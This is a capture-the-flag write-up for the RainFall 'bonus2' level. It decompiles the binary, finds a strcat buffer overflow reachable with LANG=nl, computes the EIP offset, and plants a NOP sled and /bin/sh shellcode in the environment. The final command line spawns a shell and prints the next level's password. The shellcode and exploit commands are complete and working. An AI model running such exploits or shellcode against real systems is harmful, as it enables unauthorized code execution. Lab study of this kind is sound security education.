# Bonus2

We have an executable file, but nothing happens.

```
$ ls
bonus2
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 test
```

Here is an overview of the code. via dogbolt.
</br>
<<https://dogbolt.org>>

```
void greetuser()
{
    char ptr[4];  // [bp-0x4c], Other Possible Types: unsigned int
    unsigned int v1;  // [bp-0x48]
    unsigned int v2;  // [bp-0x44]
    unsigned int v3;  // [bp-0x40]
    unsigned short v4;  // [bp-0x3c]
    char result;  // [bp-0x3a]
    char v6;  // [bp+0x4]

    if (language == 1)
    {
        ptr = 3279321416;
        v1 = 547668900;
        v2 = 1772405616;
        v3 = 3282355062;
        v4 = 8356;
        result = 0;
    }
    else if (language == 2)
    {
        strncpy(ptr, "Goedemiddag! ", 13);
    }
    else if (!language)
    {
        strncpy(ptr, "Hello ", 6);
    }
    strcat(&ptr, &v6);
    puts(&ptr);
    return;
}

extern unsigned int language;

int main(unsigned int a0, char **a1)
{
    void* *cur;  // edi
    unsigned int result;  // ecx
    char iter[4];  // edi
    char j[4];  // esi
    unsigned int flag1;  // ecx
    void* v0;  // [bp-0xb0]
    char v1[40];  // [bp-0x60]
    char v2[36];  // [bp-0x38]
    void* flag2;  // [bp-0x14]

    if (a0 != 3)
        return 1;
    cur = &v1;
    for (result = 19; result; cur += 1)
    {
        result -= 1;
        *(cur) = 0;
    }
    strncpy(&v1, a1[1], 40);
    strncpy(&v2, a1[2], 32);
    v0 = "LANG";
    flag2 = getenv("LANG");
    if (flag2)
    {
        v0 = flag2;
        if (!memcmp(flag2, "fi", 2))
        {
            language = 1;
        }
        else
        {
            v0 = flag2;
            if (!memcmp(flag2, "nl", 2))
                language = 2;
        }
    }
    iter = &v0;
    j = &v1;
    for (flag1 = 19; flag1; j += 1)
    {
        flag1 -= 1;
        *(iter) = *(j);
        iter += 1;
    }
    return (unsigned int)greetuser();
}
```

The program expects two arguments.

```
	if (a0 != 3)
		return 1;
```

```
$ ./bonus2 test1 test2
Hello test1
```

We then see that it copies the arguments, max 40 bytes for the first and 32 for the second.

```
	strncpy(&v1, a1[1], 40);
	strncpy(&v2, a1[2], 32);
```

Then we look at the environment variable "LANG".
</br>
If it starts with "fi", language = 1.
</br>
If it starts with "nl", language = 2.
</br>
Otherwise, language = 0.

```
    v0 = "LANG";
    flag2 = getenv("LANG");
    if (flag2)
    {
        v0 = flag2;
        if (!memcmp(flag2, "fi", 2))
        {
            language = 1;
        }
        else
        {
            v0 = flag2;
            if (!memcmp(flag2, "nl", 2))
                language = 2;
        }
    }
```

Now we can see that the function ``greetuser`` performs ``strncpy``, so we can probably use it for ``overflow in eip``.
</br>
We can also see that if ``language = 2``, the overflow will be simpler.
</br>
This is because it adds ``13 characters``.

```
	else if (language == 2)
    {
        strncpy(ptr, "Goedemiddag! ", 13);
    }
    else if (!language)
    {
        strncpy(ptr, "Hello ", 6);
    }
```

```
export LANG=nl
```

Now we're going to calculate the ``offset`` to overwrite ``eip``.
</br>
We will use this site to generate strings to find the offset.
</br>
<<https://wiremask.eu/tools/buffer-overflow-pattern-generator/>>

0x38614137 = 8aA7 = 7Aa8 in little-endian.
So we have an offset of 23.

```
$ gdb ./bonus2
(gdb) r $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()
```

Now we need to successfully ``inject a shellcode``. To do this, ``we will modify our export``.
</br>
We will always ``put nl at the beginning, followed by the NOP instruction, then the shellcode``.

```
"\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80"
```

```
export LANG=nl$(python -c 'print "\x90"*100 + "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80"')
```

Now we need to ``find the address of LANG``.
</br>
We'll ``break on greetuser`` to ``read the stack``.
</br>
We find that lang starts at ``0xbffffea9``.
</br>
We'll shift this address a little to hit the NOP instructions and use ``0xbffffec9``.

```
$ gdb ./bonus2
(gdb) disas main
...
   0x08048627 <+254>:   mov    %eax,%ecx
   0x08048629 <+256>:   rep movsl %ds:(%esi),%es:(%edi)
   0x0804862b <+258>:   call   0x8048484 <greetuser>			<-- We want to break here.
   0x08048630 <+263>:   lea    -0xc(%ebp),%esp
...
End of assembler dump.
(gdb) break *0x8048484
Breakpoint 1 at 0x8048484
(gdb) run $(python -c 'print "A"*40') $(python -c 'print "B"*32')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*32')

Breakpoint 1, 0x08048484 in greetuser ()
(gdb) x/500s $esp
...
0xbffffe93:      "PWD=/home/user/bonus2"
0xbffffea9:      "LANG=nl\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\22---Type <return> to continue, or q <return> to quit---
0\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\311\061\322Ph//shh/bin\203\310\001\301\340\003\203\310\003\215\034$\315\200"
0xbfffff34:      "LINES=30"
...
```

Now all that remains is to convert ``0xbffffec9`` to little-endian ``\xc9\xfe\xff\xbf``.
</br>
And to create the command with 40 characters in argv[1] and 23 for padding in argv[2].

```
$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "A"*23 + "\xc9\xfe\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
